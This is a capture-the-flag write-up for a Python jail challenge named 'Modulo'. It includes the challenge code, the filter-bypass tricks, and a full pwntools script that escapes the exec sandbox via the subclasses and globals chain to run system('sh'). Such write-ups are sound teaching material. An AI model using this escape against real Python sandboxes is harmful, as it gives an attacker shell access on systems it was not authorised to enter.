# Modulo

```python
import ast
print("Welcome to the jail! You're never gonna escape!")
payload = input("Enter payload: ") # No uppercase needed
blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
for i in payload:
    assert ord(i) >= 32
    assert ord(i) <= 127
    assert (payload.count('>') + payload.count('<')) <= 1
    assert payload.count('=') <= 1
    assert i not in blacklist

tree = ast.parse(payload)
for node in ast.walk(tree):
    if isinstance(node, ast.BinOp):
        if not isinstance(node.op, ast.Mod): # Modulo because why not?
            raise ValueError("I don't like math :(")
exec(payload,{'__builtins__':{},'c':getattr}) # This is enough right?
print('Bye!')
```

Requirements:

1. No builtins: use `().__class__.__base__.__subclasses__()[os_wrap_index].__init__.__globals__["system"]("sh")`
2. No lowercase letters except `c`, only allow `%` binary op: use `"%c%c" % (97, 98)` to construct strings
3. No integers: use `()<((),)` as `1`, use `-~x` as `x+1`
4. No `.`: use `getattr(A, "B")` as `A.B`

Inspired by [official writeup](https://github.com/scriptCTF/scriptCTF2025-OfficialWriteups/blob/main/Misc/Modulo/solve/solve.py) and [writeup by @squar3](http://squar3.blog/ScriptCTF-2025-Writeups/). 

Steps:

1. construct arbitrary numbers using `-~` and `()<((),)`
2. construct arbitrary strings using `"%c%c" % (ord("A"), ord("B"))` where `ord("A")` is computed in the first step
3. convert `().__class__.__base__.__subclasses__()[os_index].__init__.__globals__['system']('sh')` to use getattr where the strings are generated in the second step

Attack script:

```python
from pwn import *

context(log_level="debug")

subclasses = str(().__class__.__base__.__subclasses__())

# find the indices of the builtins
# assuming we are using the same Python version as remote

# assuming os._wrap_close is at 158
os_index = 158
assert subclasses.split(", ").index("<class 'os._wrap_close'>") == os_index

p = process(["python3", "modulo.py"])


# to construct arbitrary number: -~x = ~(~x) + 1 = x + 1, so -~-~x = x + 2, etc
# 1: ()==()
is_first = True


def number(i):
    global is_first
    if is_first:
        # we need to define O=1
        one = "()<((),)"
        added = "-~" * (i - 1)
        is_first = False
        return f"(O:={one},{added}O)[O]"
    else:
        added = "-~" * (i - 1)
        return f"({added}O)"


# to construct "abc": use "%c%c%c" % (ord("a"), ord("b"), ord("c"))
def string(s):
    fmt = "%c" * len(s)
    args = ",".join([number(ord(ch)) for ch in s])
    return f'("{fmt}"%({args}))'


# validation
assert eval(number(10)) == 10
assert eval(string("system")) == "system"

p.recvuntil(b"payload: ")

# ().__class__.__base__.__subclasses__()[os_index].__init__.__globals__['system']('sh')
# A.B -> c(A, "B") where c is getattr
# c(c(c(c(c((), "__class__"), "__base__"), "__subclasses__")()[os_index], "__init__"), "__globals__")["system"]("sh")
is_first = True
payload = f'c(c(c(c(c((), {string("__class__")}), {string("__base__")}), {string("__subclasses__")})()[{number(os_index)}], {string("__init__")}), {string("__globals__")})[{string("system")}]({string("sh")})'
p.sendline(payload.encode())
p.interactive()
```
